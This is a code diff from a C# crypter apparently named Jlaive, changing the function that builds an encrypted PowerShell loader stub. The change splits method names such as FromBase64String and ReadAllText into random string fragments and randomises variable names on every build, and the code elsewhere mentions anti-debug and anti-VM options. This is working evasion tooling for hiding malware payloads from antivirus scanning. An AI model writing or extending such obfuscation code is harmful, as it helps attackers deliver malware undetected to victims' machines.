@@ -1,6 +1,5 @@
 ﻿using System;
-using System.IO;
-using System.Reflection;
+using System.Collections.Generic;
 using System.Text;
 
 using static Jlaive.Utils;
@@ -11,52 +10,63 @@ namespace Jlaive
     {
         public static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
         {
-            string tbsreversed_var = RandomString(5, rng);
-            string tbs_var = RandomString(5, rng);
-            string contents_var = RandomString(5, rng);
-            string lastline_var = RandomString(5, rng);
-            string payload_var = RandomString(5, rng);
-            string key_var = RandomString(5, rng);
-            string aes_var = RandomString(5, rng);
-            string decryptor_var = RandomString(5, rng);
-            string msi_var = RandomString(5, rng);
-            string mso_var = RandomString(5, rng);
-            string gs_var = RandomString(5, rng);
+            string frombase64string_var = RandomString(5, rng);
+            string readalltext_var = RandomString(5, rng);
 
+            Dictionary<string, string> frombase64string = new Dictionary<string, string>() { 
+                { "$" + RandomString(4, rng), "Fro" }, 
+                { "$" + RandomString(4, rng), "mBase" },
+                {"$" + RandomString(4, rng), "64St" },
+                { "$" + RandomString(4, rng), "ring" },
+            };
+            Dictionary<string, string> readalltext = new Dictionary<string, string>() {
+                { "$" + RandomString(4, rng), "Rea" },
+                { "$" + RandomString(4, rng), "dAl" },
+                {"$" + RandomString(4, rng), "lTe" },
+                { "$" + RandomString(4, rng), "xt" },
+            };
+
+            StringBuilder obf = new StringBuilder();
+            foreach (var item in frombase64string) { obf.AppendLine(item.Key + "='" + item.Value + "';"); }
+            obf.AppendLine("$" + frombase64string_var + "=" + string.Join("+", frombase64string.Keys) + ";");
+            foreach (var item in readalltext) { obf.AppendLine(item.Key + "='" + item.Value + "';"); }
+            obf.AppendLine("$" + readalltext_var + "=" + string.Join("+", readalltext.Keys) + ";");
+
+            string stubcode = obf.ToString();
             if (mode == EncryptionMode.AES)
             {
-                string stubcode = GetEmbeddedString("Jlaive.Resources.AESStub.ps1");
+                stubcode += GetEmbeddedString("Jlaive.Resources.AESStub.ps1");
+                stubcode = stubcode.Replace("FromBase64String", "$" + frombase64string_var);
+                stubcode = stubcode.Replace("ReadAllText", "$" + readalltext_var);
                 stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                 stubcode = stubcode.Replace("DECRYPTION_IV", Convert.ToBase64String(iv));
-                stubcode = stubcode.Replace("tbsreversed_var", tbsreversed_var);
-                stubcode = stubcode.Replace("tbs_var", tbs_var);
-                stubcode = stubcode.Replace("contents_var", contents_var);
-                stubcode = stubcode.Replace("lastline_var", lastline_var);
-                stubcode = stubcode.Replace("payload_var", payload_var);
-                stubcode = stubcode.Replace("aes_var", aes_var);
-                stubcode = stubcode.Replace("decryptor_var", decryptor_var);
-                stubcode = stubcode.Replace("msi_var", msi_var);
-                stubcode = stubcode.Replace("mso_var", mso_var);
-                stubcode = stubcode.Replace("gs_var", gs_var);
-                stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
-                return stubcode;
+                stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("lastline_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("line_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("payload_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("aes_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("decryptor_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
             }
             else
             {
-                string stubcode = GetEmbeddedString("Jlaive.Resources.XORStub.ps1");
+                stubcode += GetEmbeddedString("Jlaive.Resources.XORStub.ps1");
+                stubcode = stubcode.Replace("FromBase64String", "$" + frombase64string_var);
+                stubcode = stubcode.Replace("ReadAllText", "$" + readalltext_var);
                 stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
-                stubcode = stubcode.Replace("tbsreversed_var", tbsreversed_var);
-                stubcode = stubcode.Replace("tbs_var", tbs_var);
-                stubcode = stubcode.Replace("contents_var", contents_var);
-                stubcode = stubcode.Replace("lastline_var", lastline_var);
-                stubcode = stubcode.Replace("payload_var", payload_var);
-                stubcode = stubcode.Replace("key_var", key_var);
-                stubcode = stubcode.Replace("msi_var", msi_var);
-                stubcode = stubcode.Replace("mso_var", mso_var);
-                stubcode = stubcode.Replace("gs_var", gs_var);
-                stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
-                return stubcode;
+                stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("lastline_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("line_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("payload_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("key_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
             }
+            stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
+            return stubcode;
         }
 
         public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
